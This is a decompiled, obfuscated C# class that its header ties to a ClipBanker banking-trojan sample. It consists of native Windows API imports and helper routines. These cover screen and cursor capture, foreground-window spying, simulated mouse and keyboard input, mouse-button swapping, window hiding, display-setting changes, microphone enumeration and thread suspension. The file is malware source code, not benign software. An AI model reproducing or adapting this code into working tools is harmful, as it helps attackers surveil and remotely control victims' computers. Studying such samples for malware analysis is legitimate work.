// Decompiled with JetBrains decompiler
// Type: 12k.6b9
// Assembly: uc5uTlQKZwvBJeUwoIoxWYL1o3uBI8gaMfnT9AO, Version=9.8.6.0, Culture=neutral, PublicKeyToken=null
// MVID: 66B519F9-803D-46C9-8343-EC24850CA08A
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-de0d24df79f99286da0234aa1536470d7596c53e531173d693d6ccc60b98e84c.exe

using \u00312k;
using System;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;

namespace \u00312k
{
  internal static class \u0036b9
  {
    public static string ZD9()
    {
      StringBuilder stringBuilder = new StringBuilder(1024);
      \u0036b9.z7F(\u0036b9.\u003216(), stringBuilder, stringBuilder.Capacity);
      return stringBuilder.ToString();
    }

    public static string M34(Process _param0, int _param1 = 1024)
    {
      StringBuilder stringBuilder = new StringBuilder(_param1);
      uint num = (uint) (stringBuilder.Capacity + 1);
      return \u0036b9.\u003676(_param0.Handle, 0U, stringBuilder, ref num) ? stringBuilder.ToString() : (string) null;
    }

    public static Bitmap h8Z(\u0036b9.\u0039a9 _param0, out \u0036b9.\u00345z _param1)
    {
      IntPtr handle = \u0036b9.h67(_param0.\u003466);
      if (handle == IntPtr.Zero)
      {
        _param1 = new \u0036b9.\u00345z();
        return (Bitmap) null;
      }
      if (!\u0036b9.fv2(handle, out _param1))
        return (Bitmap) null;
      try
      {
        using (Bitmap bitmap1 = Image.FromHbitmap(_param1.\u0034a1))
        {
          if (bitmap1.Height == bitmap1.Width * 2)
          {
            Bitmap bitmap2 = new Bitmap(bitmap1.Width, bitmap1.Width);
            using (Graphics graphics1 = Graphics.FromHwnd(\u0036b9.Qa4()))
            {
              IntPtr hdc1 = graphics1.GetHdc();
              IntPtr num1 = \u0036b9.\u00378x(hdc1);
              IntPtr hbitmap = bitmap1.GetHbitmap();
              IntPtr num2 = \u0036b9.\u0039hF(num1, hbitmap);
              using (Graphics graphics2 = Graphics.FromImage((Image) bitmap2))
              {
                IntPtr hdc2 = graphics2.GetHdc();
                \u0036b9.\u003584(hdc2, 0, 0, 32, 32, num1, 0, 32, \u0036b9.\u0039Uh.\u0023a);
                \u0036b9.\u003584(hdc2, 0, 0, 32, 32, num1, 0, 0, \u0036b9.\u0039Uh.\u0023d);
                graphics2.ReleaseHdc(hdc2);
              }
              \u0036b9.c9N(\u0036b9.\u0039hF(num1, num2));
              \u0036b9.lOm(hbitmap);
              \u0036b9.c9N(num1);
              \u0036b9.\u0035pd(handle);
              graphics1.ReleaseHdc(hdc1);
            }
            bitmap2.MakeTransparent(Color.White);
            return bitmap2;
          }
        }
      }
      finally
      {
        \u0036b9.lOm(_param1.\u00395D);
        \u0036b9.lOm(_param1.\u0034a1);
      }
      Bitmap bitmap3;
      using (Icon icon = Icon.FromHandle(handle))
      {
        Bitmap bitmap4 = icon.ToBitmap();
        \u0036b9.\u0035pd(handle);
        bitmap3 = bitmap4;
      }
      return bitmap3;
    }

    [DllImport("user32.dll", EntryPoint = "GetMessageExtraInfo")]
    internal static extern IntPtr \u0039R7();

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll", EntryPoint = "CloseHandle", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool B61(IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "DestroyIcon", SetLastError = true)]
    internal static extern bool \u0035pd([In] IntPtr obj0);

    [DllImport("gdi32.dll", EntryPoint = "DeleteObject")]
    internal static extern bool lOm([In] IntPtr obj0);

    [DllImport("gdi32.dll", EntryPoint = "SelectObject")]
    internal static extern IntPtr \u0039hF([In] IntPtr obj0, [In] IntPtr obj1);

    [DllImport("gdi32.dll", EntryPoint = "CreateCompatibleDC")]
    internal static extern IntPtr \u00378x([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
    internal static extern IntPtr Qa4();

    [DllImport("gdi32.dll", EntryPoint = "BitBlt", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    internal static extern bool \u0038h1(
      [In] IntPtr _param0,
      int _param1,
      int _param2,
      int _param3,
      int _param4,
      [In] IntPtr _param5,
      int _param6,
      int _param7,
      int _param8);

    [DllImport("gdi32.dll", EntryPoint = "BitBlt")]
    public static extern bool \u003584(
      [In] IntPtr obj0,
      [In] int obj1,
      [In] int obj2,
      [In] int obj3,
      [In] int obj4,
      [In] IntPtr obj5,
      [In] int obj6,
      [In] int obj7,
      [In] \u0036b9.\u0039Uh obj8);

    [DllImport("gdi32.dll", EntryPoint = "CreateDC")]
    internal static extern IntPtr y65([In] string obj0, [In] string obj1, [In] string obj2, [In] IntPtr obj3);

    [DllImport("gdi32.dll", EntryPoint = "DeleteDC")]
    internal static extern bool c9N([In] IntPtr _param0);

    [DllImport("user32.dll", EntryPoint = "SetCursorPos")]
    internal static extern bool G8l([In] int obj0, [In] int obj1);

    [DllImport("user32.dll", EntryPoint = "SwapMouseButton")]
    public static extern int \u0035LS([In] int obj0);

    [DllImport("user32.dll", EntryPoint = "mouse_event")]
    internal static extern void qP2([In] uint obj0, [In] int obj1, [In] int obj2, [In] int obj3, [In] UIntPtr obj4);

    [DllImport("kernel32.dll", EntryPoint = "QueryFullProcessImageName")]
    private static extern bool \u003676(
      [In] IntPtr _param0,
      [In] uint _param1,
      [Out] StringBuilder _param2,
      [In, Out] ref uint _param3);

    [DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
    public static extern bool Aix(out \u0036b9.\u0039a9 _param0);

    [DllImport("user32.dll", EntryPoint = "CopyIcon")]
    public static extern IntPtr h67([In] IntPtr obj0);

    [DllImport("user32.dll", EntryPoint = "GetIconInfo")]
    public static extern bool fv2(IntPtr _param0, out \u0036b9.\u00345z _param1);

    [DllImport("user32.dll", EntryPoint = "FindWindow")]
    public static extern int t9d([In] string obj0, [In] string obj1);

    [DllImport("user32.dll", EntryPoint = "ShowWindow")]
    public static extern int \u003246([In] int obj0, [In] int obj1);

    [DllImport("user32.dll", EntryPoint = "SystemParametersInfo", CharSet = CharSet.Auto)]
    public static extern int q7P([In] int obj0, [In] int obj1, [In] string obj2, [In] int obj3);

    [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
    internal static extern void j67([In] string obj0, [In] string obj1, [In] long obj2, [In] long obj3);

    [DllImport("user32.dll", EntryPoint = "GetForegroundWindow")]
    internal static extern IntPtr \u003216();

    [DllImport("user32.dll", EntryPoint = "GetWindowText", CharSet = CharSet.Unicode, SetLastError = true)]
    internal static extern int z7F([In] IntPtr obj0, [In] StringBuilder obj1, [In] int obj2);

    public sealed class \u0034M4
    {
      [DllImport("winmm.dll", EntryPoint = "waveInGetNumDevs", SetLastError = true)]
      public static extern uint \u003646();

      [DllImport("winmm.dll", EntryPoint = "waveInGetDevCaps", CharSet = CharSet.Auto, SetLastError = true)]
      public static extern uint I21([In] uint obj0, [In] ref \u0036b9.\u0034M4.v8N obj1, [In] uint obj2);

      [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
      public struct v8N
      {
        public ushort NYg;
        public ushort prP;
        public uint P8j;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 64)]
        public string \u00373o;
        public uint \u003223;
        public ushort \u003786;
        public ushort \u0033Ve;
        public uint \u00331B;
      }
    }

    public sealed class \u0037Qs
    {
      [DllImport("user32.dll", EntryPoint = "ChangeDisplaySettingsEx")]
      internal static extern \u0036b9.\u0037Qs.\u00345Y qIZ(
        [In] string obj0,
        [In] ref \u0036b9.\u0037Qs.\u0034a7 obj1,
        [In] IntPtr obj2,
        [In] \u0036b9.\u0037Qs.\u0038cU obj3,
        [In] IntPtr obj4);

      [DllImport("user32.dll", EntryPoint = "EnumDisplayDevices")]
      internal static extern bool KEI(
        [In] string obj0,
        [In] uint obj1,
        [In] ref \u0036b9.\u0037Qs.S6S obj2,
        [In] uint obj3);

      [DllImport("user32.dll", EntryPoint = "EnumDisplaySettings", CharSet = CharSet.Ansi)]
      internal static extern int \u0039L9(
        [In] string obj0,
        [In] int obj1,
        [In] ref \u0036b9.\u0037Qs.\u0034a7 obj2);

      internal enum \u00345Y
      {
        \u0023h = -6, // 0xFFFFFFFA
        \u0023g = -5, // 0xFFFFFFFB
        \u0023f = -4, // 0xFFFFFFFC
        \u0023e = -3, // 0xFFFFFFFD
        \u0023d = -2, // 0xFFFFFFFE
        \u0023c = -1, // 0xFFFFFFFF
        \u0023a = 0,
        \u0023b = 1,
      }

      [Flags]
      internal enum CUs
      {
        \u0023a = 1,
        \u0023b = 2,
        \u0023c = 4,
        \u0023d = 8,
        \u0023e = 16, // 0x00000010
        \u0023f = 32, // 0x00000020
        \u0023g = 134217728, // 0x08000000
        \u0023h = 67108864, // 0x04000000
        \u0023i = 33554432, // 0x02000000
      }

      [Flags]
      internal enum \u0038cU
      {
        \u0023a = 0,
        \u0023b = 1,
        \u0023c = 2,
        \u0023d = 4,
        \u0023e = 8,
        \u0023f = 16, // 0x00000010
        \u0023g = 32, // 0x00000020
        \u0023h = 256, // 0x00000100
        \u0023i = 512, // 0x00000200
        \u0023j = 1073741824, // 0x40000000
        \u0023k = 536870912, // 0x20000000
        \u0023l = 268435456, // 0x10000000
      }

      [Flags]
      internal enum \u003285
      {
        \u0023a = 1,
        \u0023b = 2,
        \u0023c = 4,
        \u0023d = 8,
        \u0023e = 16, // 0x00000010
        \u0023f = 32, // 0x00000020
        \u0023g = 64, // 0x00000040
        \u0023h = 128, // 0x00000080
        \u0023i = 256, // 0x00000100
        \u0023j = 512, // 0x00000200
        \u0023k = 1024, // 0x00000400
        \u0023l = 2048, // 0x00000800
        \u0023m = 4096, // 0x00001000
        \u0023n = 8192, // 0x00002000
        \u0023o = 16384, // 0x00004000
        \u0023p = 32768, // 0x00008000
        \u0023q = 65536, // 0x00010000
        \u0023r = 131072, // 0x00020000
        \u0023s = 262144, // 0x00040000
        \u0023t = 524288, // 0x00080000
        \u0023u = 1048576, // 0x00100000
        \u0023v = 2097152, // 0x00200000
        \u0023w = 4194304, // 0x00400000
        \u0023x = 8388608, // 0x00800000
        \u0023y = 16777216, // 0x01000000
        \u0023z = 33554432, // 0x02000000
        \u0023A = 67108864, // 0x04000000
        \u0023B = 134217728, // 0x08000000
        \u0023C = 268435456, // 0x10000000
        \u0023D = 536870912, // 0x20000000
      }

      [StructLayout(LayoutKind.Explicit)]
      internal struct \u0034a7
      {
        public const int \u003381 = 32;
        public const int \u0035Vc = 32;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        [FieldOffset(0)]
        public string Pjt;
        [FieldOffset(32)]
        public short e34;
        [FieldOffset(34)]
        public short jtw;
        [FieldOffset(36)]
        public short \u0039g5;
        [FieldOffset(38)]
        public short \u0036gP;
        [FieldOffset(40)]
        public \u0036b9.\u0037Qs.\u003285 \u00364d;
        [FieldOffset(44)]
        private short P61;
        [FieldOffset(46)]
        private short zbv;
        [FieldOffset(48)]
        private short \u003929;
        [FieldOffset(50)]
        private short \u00371R;
        [FieldOffset(52)]
        private short TTr;
        [FieldOffset(54)]
        private short \u0033WR;
        [FieldOffset(56)]
        private short \u0032Es;
        [FieldOffset(58)]
        private short x32;
        [FieldOffset(44)]
        public \u0036b9.\u00394b lR6;
        [FieldOffset(52)]
        public int b2f;
        [FieldOffset(56)]
        public int \u0038AB;
        [FieldOffset(60)]
        public short \u0037M1;
        [FieldOffset(62)]
        public short ZI7;
        [FieldOffset(64)]
        public short \u0034so;
        [FieldOffset(66)]
        public short pG4;
        [FieldOffset(68)]
        public short \u0033a2;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        [FieldOffset(72)]
        public string \u00312A;
        [FieldOffset(102)]
        public short z8j;
        [FieldOffset(104)]
        public int n8l;
        [FieldOffset(108)]
        public int xH4;
        [FieldOffset(112)]
        public int \u003321;
        [FieldOffset(116)]
        public int kYG;
        [FieldOffset(116)]
        public int o35;
        [FieldOffset(120)]
        public int n73;
      }

      internal struct S6S
      {
        [MarshalAs(UnmanagedType.U4)]
        public int axk;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 32)]
        public string \u00389N;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string r26;
        [MarshalAs(UnmanagedType.U4)]
        public \u0036b9.\u0037Qs.CUs \u00315J;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string rMx;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 128)]
        public string W2c;
      }
    }

    public sealed class Kp6
    {
      [DllImport("user32.dll", EntryPoint = "SendInput")]
      internal static extern uint \u0035nr(uint _param0, [MarshalAs(UnmanagedType.LPArray), In] \u0036b9.Kp6.m1C[] _param1, int _param2);

      internal struct m1C
      {
        internal uint Y48;
        internal \u0036b9.Kp6.\u00332L \u003334;
      }

      [StructLayout(LayoutKind.Explicit)]
      internal struct \u00332L
      {
        [FieldOffset(0)]
        internal \u0036b9.Kp6.Bb3 \u00314O;
        [FieldOffset(0)]
        internal \u0036b9.Kp6.\u00373s LFd;
        [FieldOffset(0)]
        internal \u0036b9.Kp6.SH5 tB9;
      }

      internal struct Bb3
      {
        internal int m13;
        internal int d45;
        internal int t12;
        internal uint Ltn;
        internal uint v8h;
        internal IntPtr huz;
      }

      internal struct \u00373s
      {
        internal ushort ZQa;
        internal ushort \u003743;
        internal uint \u0037Q6;
        internal uint b48;
        internal IntPtr z3S;
      }

      internal struct SH5
      {
        public uint gmB;
        public ushort W41;
        public ushort hP3;
      }
    }

    public sealed class A7G
    {
      [DllImport("kernel32.dll", EntryPoint = "SuspendThread")]
      internal static extern uint \u003266([In] IntPtr obj0);

      [DllImport("kernel32.dll", EntryPoint = "ResumeThread")]
      internal static extern int \u0035sl([In] IntPtr obj0);

      [DllImport("kernel32.dll", EntryPoint = "OpenThread")]
      internal static extern IntPtr \u0037Oq(
        [In] \u0036b9.A7G.\u0035lj obj0,
        [In] bool obj1,
        [In] uint obj2);

      public enum \u0035lj
      {
        \u0023a = 1,
        \u0023b = 2,
        \u0023c = 8,
        \u0023d = 16, // 0x00000010
        \u0023e = 32, // 0x00000020
        \u0023f = 64, // 0x00000040
        \u0023g = 128, // 0x00000080
        \u0023h = 256, // 0x00000100
        \u0023i = 512, // 0x00000200
      }
    }

    public struct \u00345z
    {
      public bool \u003993;
      public int \u0039NC;
      public int \u003699;
      public IntPtr \u0034a1;
      public IntPtr \u00395D;
    }

    public struct \u0039a9
    {
      public int M1m;
      public int \u00342Y;
      public IntPtr \u003466;
      public \u0036b9.\u0034P4 j81;
    }

    public struct \u0034P4
    {
      public int x57;
      public int \u0033k2;
    }

    public enum \u0039Uh : uint
    {
      \u0023n = 66, // 0x00000042
      \u0023g = 1114278, // 0x001100A6
      \u0023f = 3342344, // 0x00330008
      \u0023e = 4457256, // 0x00440328
      \u0023m = 5570569, // 0x00550009
      \u0023l = 5898313, // 0x005A0049
      \u0023d = 6684742, // 0x00660046
      \u0023c = 8913094, // 0x008800C6
      \u0023i = 12255782, // 0x00BB0226
      \u0023h = 12583114, // 0x00C000CA
      \u0023a = 13369376, // 0x00CC0020
      \u0023b = 15597702, // 0x00EE0086
      \u0023j = 15728673, // 0x00F00021
      \u0023k = 16452105, // 0x00FB0A09
      \u0023o = 16711778, // 0x00FF0062
      \u0023p = 1073741824, // 0x40000000
    }

    internal struct \u00394b
    {
      private long Je7;
      private long \u00349i;
    }
  }
}
